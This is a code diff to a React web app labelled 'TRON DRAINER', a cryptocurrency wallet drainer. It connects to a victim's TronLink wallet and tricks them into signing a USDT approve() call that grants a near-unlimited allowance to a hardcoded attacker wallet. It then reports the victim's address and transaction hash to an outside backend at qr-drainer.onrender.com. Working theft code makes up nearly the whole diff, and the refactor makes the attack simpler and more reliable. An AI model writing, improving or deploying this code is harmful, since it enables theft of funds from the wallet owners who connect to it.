@@ -2,8 +2,7 @@ import React, { useState } from "react";
 
 // CONFIGURATION
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
-// PASTE YOUR ACCOUNT 01 ADDRESS HERE (Copied from TronLink)
-const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; 
+const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
 const BACKEND = "https://qr-drainer.onrender.com";
 
 export default function App() {
@@ -22,67 +21,45 @@ export default function App() {
       return;
     }
 
-    // VALIDATE ATTACKER ADDRESS FIRST
+    // 1. VALIDATE ADDRESS
     if (!window.tronWeb.isAddress(ATTACKER_WALLET)) {
-      addLog(`FATAL: ATTACKER_WALLET is invalid! Please copy it directly from TronLink Account 01.`);
+      addLog(`FATAL: ATTACKER_WALLET is invalid!`);
       setStatus("Failed: Invalid Attacker Address");
       return;
     }
     addLog(`Attacker Address Validated: ${ATTACKER_WALLET}`);
 
     const victimAddress = window.tronWeb.defaultAddress.base58;
-    const ownerHex = window.tronWeb.defaultAddress.hex;
     addLog(`Connected (Victim): ${victimAddress}`);
 
-    let spenderHex = "";
     try {
-      spenderHex = window.tronWeb.address.toHex(ATTACKER_WALLET);
-      addLog(`Attacker Hex: ${spenderHex}`);
-    } catch (e) {
-      addLog(`FATAL: Could not convert attacker address to hex.`);
-      setStatus("Failed: Hex Conversion Error");
-      return;
-    }
-
-    try {
-      setStatus("Building Payload...");
+      setStatus("Loading Token Contract...");
+      addLog("Connecting to USDT Contract...");
       
-      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        TOKEN_ADDRESS,
-        "approve(address,uint256)",
-        { feeLimit: 100000000, callValue: 0 },
-        [
-          { type: 'address', value: spenderHex }, 
-          { type: 'uint256', value: "1000000000000000" }
-        ],
-        ownerHex
-      );
-
-      if (!transaction.result || !transaction.result.result) {
-        throw new Error("Contract call rejected by node");
-      }
-      addLog("Transaction built successfully.");
+      // 2. THE BULLETPROOF METHOD
+      // This automatically handles all Hex encoding and ABI formatting.
+      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
+      addLog("Contract loaded successfully.");
 
       setStatus("Requesting Signature...");
-      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
-      addLog("Transaction signed!");
-
-      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
+      addLog("Sending approve transaction to wallet...");
       
-      if (!broadcast.result) {
-        throw new Error("Broadcast failed");
-      }
+      // This triggers the TronLink popup and handles the signing/broadcasting
+      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
+        feeLimit: 100000000, // 100 TRX fee limit
+        from: victimAddress
+      });
 
-      const txId = broadcast.txid;
-      addLog(`Broadcast successful! TX ID: ${txId}`);
+      addLog(`Transaction Broadcasted! TX ID: ${tx}`);
       setStatus("Success! Alerting Backend...");
 
+      // 3. ALERT BACKEND
       await fetch(`${BACKEND}/api/alert`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           victimAddress: victimAddress,
-          txHash: txId,
+          txHash: tx,
           network: "TRON Shasta"
         })
       });
@@ -99,7 +76,7 @@ export default function App() {
 
   return (
     <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
-      <h1>TRON DRAINER - FINAL DEBUG</h1>
+      <h1>TRON DRAINER - FINAL ENGINE TEST</h1>
       <p>Current Status: <strong>{status}</strong></p>
       
       <button 
